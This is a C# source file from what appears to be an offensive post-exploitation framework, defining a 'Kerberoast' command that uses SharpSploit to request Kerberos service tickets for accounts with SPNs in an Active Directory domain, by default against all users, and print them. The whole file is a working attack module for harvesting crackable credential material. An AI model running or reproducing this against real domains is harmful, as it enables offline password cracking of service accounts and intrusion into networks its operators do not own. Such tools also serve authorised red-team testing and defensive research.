using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpAttack.Utils;
using SharpSploit.Enumeration;

namespace SharpAttack.Commands
{
  class Kerberoast : Command
  {

    public override void Run(Dictionary<String, Parameter> RunParams)
    {
      Domain.DomainSearcher domainSearcher = new Domain.DomainSearcher();
      List<string> Usernames = null;
      string LDAPFilter = null;
      if (RunParams.TryGetValue("UserName", out Parameter username))
      {
        Usernames = username.Value;
      }

      if (RunParams.TryGetValue("LDAPFilter", out Parameter ldapfilter))
      {
        LDAPFilter = ldapfilter.Value[0];
      }

      List<Domain.SPNTicket> sPNTickets = domainSearcher.Kerberoast(Usernames, LDAPFilter);

      foreach (Domain.SPNTicket spnTicket in sPNTickets)
      {
        Printing.CmdOutput(spnTicket.ToString());
      }
    }

    public Kerberoast()
    {
      Name = "Kerberoast";
      Helptext = "Returns a list of SPNs associated with user accounts";
      Parameters.Add("UserName", new Parameter("The users to target. Accepts a comma seperated list. If not specified, will try against all users in domain.", 0));
      Parameters.Add("LDAPFilter", new Parameter("Filter to apply to LDAP query"));
      Register();
    }
  }
}
